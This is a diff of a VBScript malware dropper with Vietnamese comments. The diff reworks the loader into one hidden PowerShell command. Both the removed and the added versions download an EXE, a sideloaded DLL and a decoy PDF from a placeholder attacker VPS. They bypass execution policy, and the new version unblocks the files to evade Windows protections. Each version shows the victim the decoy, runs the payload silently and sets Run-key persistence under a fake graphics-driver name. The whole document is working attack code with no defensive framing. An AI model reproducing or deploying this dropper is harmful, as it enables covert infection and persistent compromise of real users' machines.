@@ -1,34 +1,17 @@
 Set WshShell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
 strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
+IP = "IP_VPS_CUA_BAN"
 
-' Cấu hình link VPS và tên file
-server = "http://IP_CUA_BAN/"
-exeFile = "app.exe"
-dllFile = "vinh.dll"
-pdfFile = "decoy.pdf"
+' Script PowerShell: Tải -> Mở khóa -> Chạy đúng vị trí
+' Dùng Unblock-File để Windows cho phép EXE nạp DLL
+psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+"""$t=$env:TEMP; " & _
+"iwr 'http://" & IP & "/app.exe' -OutF '$t\app.exe'; " & _
+"iwr 'http://" & IP & "/vinh.dll' -OutF '$t\vinh.dll'; " & _
+"iwr 'http://" & IP & "/decoy.pdf' -OutF '$t\decoy.pdf'; " & _
+"Unblock-File -Path '$t\app.exe'; Unblock-File -Path '$t\vinh.dll'; " & _
+"Start-Process '$t\decoy.pdf'; " & _
+"Start-Process -FilePath '$t\app.exe' -WorkingDirectory '$t'; " & _
+"New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsGraphics' -Value '$t\app.exe' -PropertyType 'String' -Force"""
 
-' Lệnh PowerShell để tải file (Dùng WebClient để kín đáo hơn)
-downloadCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
-" $w=New-Object Net.WebClient; " & _
-" $w.DownloadFile('" & server & exeFile & "', '" & strTemp & "\" & exeFile & "'); " & _
-" $w.DownloadFile('" & server & dllFile & "', '" & strTemp & "\" & dllFile & "'); " & _
-" $w.DownloadFile('" & server & pdfFile & "', '" & strTemp & "\" & pdfFile & "'); "
-
-' 1. Thực hiện tải file ngầm
-WshShell.Run downloadCmd, 0, True ' True để đợi tải xong mới chạy tiếp dòng dưới
-
-' 2. Kiểm tra xem file EXE đã tải về chưa rồi mới chạy
-If fso.FileExists(strTemp & "\" & exeFile) Then
-    ' Chạy EXE ngầm
-    WshShell.Run """" & strTemp & "\" & exeFile & """", 0, False
-    
-    ' Mở PDF cho nạn nhân xem (Mồi nhử)
-    If fso.FileExists(strTemp & "\" & pdfFile) Then
-        WshShell.Run "cmd /c start """" """ & strTemp & "\" & pdfFile & """", 0, False
-    End If
-    
-    ' 3. Thiết lập Persistence (Tự khởi động)
-    regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinGraphicsDriver"
-    WshShell.RegWrite regPath, strTemp & "\" & exeFile, "REG_SZ"
-End If
+WshShell.Run psCmd, 0, False
